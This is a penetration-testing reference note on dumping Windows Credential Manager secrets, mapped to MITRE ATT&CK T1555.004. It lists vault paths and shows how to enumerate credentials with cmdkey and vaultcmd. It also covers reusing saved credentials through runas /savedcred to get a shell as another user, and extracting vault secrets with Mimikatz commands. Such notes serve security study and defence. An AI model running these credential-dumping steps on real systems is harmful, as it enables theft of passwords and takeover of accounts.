---
created: 2026-03-06
tags:
  - Windows
  - Windows_credential_dumping
  - password_attacks
---
>**MITRE ATT&CK**: [`T1555.004 — Credentials from Password Stores: Windows Credential Manager`](https://attack.mitre.org/techniques/T1555/004/)

### Table of contents

- [[#Windows Credential Manager]]
	- [[#Vault directory structure]]
- [[#Enumerating credentials]]
	- [[#cmdkey]]
	- [[#vaultcmd]]
	- [[#Manual filesystem enumeration]]
- [[#runas /savedcred]]
- [[#Extracting credentials using Mimikatz]]
- [[#References and further reading]]

## Windows Credential Manager

>**Windows Credential Manager** is a built-in Windows subsystem designed to securely store authentication secrets used by the OS, applications, and network services.

- Credential Manager was first introduced in Windows 7 and Windows Server 2008 R2.
- The system uses Credential Manager to store credentials for websites and online accounts (Internet Explorer and legacy versions of Microsoft Edge), as well as credentials for various services such as OneDrive, credentials related to domain users, local network resources, services, and shared folders.

>Credentials stored by Windows Credential Manager are encrypted and planed in protected storage containers known as **Credential Lockers** or **Windows Vaults**.

- Vaults are stored under user and system profiles under:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

- `%UserProfile%\...` directories hold user-specific credentials.
- `%ProgramData%\..` and `%SystemRoot%\System32\config\systemprofile\...` contain system-level vaults.

### Vault directory structure

- Each vault directory is named after the GUID that identifies the vault.
- Vault directory follows the structure:

```
VaultGUID\
 ├── Policy.vpol
 ├── *.vcrd
 ├── *.vsch
```

- `Policy.vpol`
	- The **vault policy file**; contains **AES encryption keys** (AES-128 or AES-256) used to encrypt and decrypt the credentials stored in `.vcrd`.
	- The keys themselves are protected by DPAPI.
- `.vcrd` files
	- Contain the actual credential records; credentials are encrypted with the AES keys stored in `Policy.vpol`.
- `.vsch` files
	- Schema files that describe the structure of credential records within the vault. They define how credential data is interpreted by the vault subsystem.

>[!note] To learn more about DPAPI and how to retrieve secrets it protects, see [[DPAPI credentials]].

## Enumerating credentials

There are several tools you can use to enumerate credentials stored in Credential Vaults:
- [`cmdkey`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
- `vaultcmd.exe`
- 
### cmdkey

>[`cmdkey`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) is a native Windows command used to create, list, and delete credentials stored in Credential Manager.

- List currently stored credentials for the current user:

```powershell
cmdkey /list
```


> [!example]+
> 
> ```powershell
> cmdkey /list
> ```
> 
> ```powerhsell
> Currently stored credentials:
> 
>     Target: Domain:interactive=SRV01\mcharles
>     Type: Domain Password
>     User: SRV01\mcharles
> ```
> ![[cmdkey_list.png]]

Stored credentials are listed in the following format:
- `Target`
	- The resource associated with the credential.
- `Type`
	- Credential type (e.g., `Generic` for general credentials, `Domain Password` for domain user passwords).
- `User`
	- The user account associated with the credential.
- `Persistence`
	- Whether the credential persists after reboot.
	- Credentials marked with `Local machine persistence` survive reboots.
### vaultcmd


`vaultcmd.exe` gives you a slightly different view — it interacts directly with the vault subsystem rather than through the Credential Manager API.

- List all registered vault containers:

```powershell
vaultcmd /list
```

- List the contents of a specific vault (use the vault name returned by `/list`):

```powershell
vaultcmd /listcreds:"Windows Credentials"
```

```powershell
vaultcmd /listcreds:"Web Credentials"
```

- List properties of a specific vault:

```powershell
vaultcmd /listproperties:"Windows Credentials"
```

### Manual filesystem enumeration

- List vault directories for the current user:

```powershell
dir "%UserProfile%\AppData\Local\Microsoft\Vault\" /a
```

```powershell
dir "%UserProfile%\AppData\Roaming\Microsoft\Vault\" /a
```

- List credential files:

```powershell
dir "%UserProfile%\AppData\Local\Microsoft\Credentials\" /a
```

- System-level vaults (requires Administrator access):

```powershell
dir "%ProgramData%\Microsoft\Vault\" /a
```

```powershell
dir "%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\" /
```

## runas /savedcred

>[`runas.exe`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) is a native Windows command-line tool that allows a user to execute a processes **under a different user security context**.

- Basic syntax:

```powershell
runas /user:<domain\<user> <command>
```

- Normally, Windows prompts you for the password and then creates a new logon session. The new process runs with the security token of the specified user.

- The `/savedcred` option changes this behavior. On the first execution, it prompts for the password, and stores the credential in the Credential Manager. Further executions **reuse the stored credential automatically**.

```powerhshell
runas /savedcred /user:<domain\<user> <command>
```

This means that if a credential already exists in Credential Manager for a privileged account, **you may be able to execute commands on their behalf without knowing the password**.

>[!warning] `/savedcred` only works if the credential _already exists_ in Credential Manager.

>[!example]
>![[runas_savedcred.png]]

>[!example]+
>For example, if `cmdkey /list` outputs:
>```
>Target: Domain:interactive=SRV01\mcharles
>Type: Domain Password
>User: SRV01\mcharles
>```
>You can run:
>```
> runas /savecred /user:SRV01\mcharles cmd
>```
>And get a shell as `SRV01\mcharles` never knowing their password. 

## Extracting credentials using Mimikatz

If you have `privilege::debug`, you can use the [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s  `sekurlsa::credman` module to extract credentials stored in Credential Manager for active sessions:

1. Request `SeDebugPrivilege` using `privilege::debug`:

```powershell
privilege::debug
```

2. Retrieve Credential Manager credentials:

```powershell
sekurlsa::credman
```

>[!example]+
>![[sekurlsa_credman.png]]

Mimikatz also has a `vault` module for enumerating vault contents:

- List vault contents:

```powershell
vault::list
```

- Extract credentials stored in vaults:

```powershell
vault::cred
```

> [!example]+
> ![[vault_list_vault_cred.png]]
## References and further reading

- [`Windows Credential Manager — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/windows-credential-manager)
- [`Credentials from Password Stores: Windows Credential Manager — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1555/004/)

